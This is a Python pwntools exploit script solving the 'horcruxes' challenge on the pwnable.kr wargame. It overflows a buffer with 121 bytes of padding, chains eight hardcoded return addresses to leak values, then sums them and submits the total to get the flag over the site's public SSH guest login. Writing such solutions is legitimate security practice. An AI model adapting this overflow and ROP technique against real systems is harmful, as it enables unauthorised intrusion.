#!/usr/bin/python

#horcruxes from pwnable.kr

from pwn import *
import re

targets = [0x0809fe4b, 0x0809fe6a, 0x0809fe89, 0x0809fea8, 0x0809fec7, 0x0809fee6, 0x0809ff05, 0x0809fffc]

def craft_payload(targets):
    payload = 'A'*121
    for i in targets:
        payload += p32(i)
    return payload

def exploit(payload):
    s = ssh(host="pwnable.kr", user="horcruxes", password="guest", port=2222)
    sh = s.remote("localhost", 9032)
    sh.recvuntil(':')
    sh.sendline(payload)
    line = ''
    for i in range(0, 8):
        line += sh.recvline()

    points = re.findall(r'-?\d+\.?\d*', line)
    total = sum([int(i) for i in points]) & 0xffffffff

    if total >> 31 == 1:
        total -= 0x100000000
    sh.recvuntil(':')
    sh.sendline("666")
    sh.recvuntil(':')
    sh.sendline(str(total))
    log.success(sh.recvline())

def main():
    exploit(craft_payload(targets))

if __name__=="__main__":
    main()
